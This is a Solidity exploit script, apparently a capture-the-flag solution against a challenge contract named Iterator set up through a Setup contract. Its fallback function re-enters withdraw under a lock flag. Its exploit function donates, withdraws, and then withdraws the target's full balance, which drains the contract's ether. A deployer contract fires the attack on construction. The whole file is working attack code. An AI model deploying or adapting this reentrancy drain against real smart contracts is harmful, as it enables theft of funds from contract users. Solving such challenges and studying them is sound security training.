pragma solidity ^0.6.0;

import "public/Setup.sol";

contract Exploiter {

    // prevents infinite loop reentrancy
    bool private lock;

    fallback() external payable {

        if (lock) {
            return;
        }

        lock = true;

        Iterator iterator = Iterator(msg.sender);
        uint balance = iterator.balanceOf(address(this));
        iterator.withdraw(balance);

        lock = false;
    }

    function exploit(Setup setup) external payable {
        require(msg.value >= 0);
        Iterator iterator = setup.iterator();
        iterator.donate.value(msg.value)(address(this));
        iterator.withdraw(msg.value);
        iterator.withdraw(address(iterator).balance);
    }
}

contract Exploit {
    constructor(Setup setup) public payable {
        new Exploiter().exploit.value(msg.value)(setup);
    }
}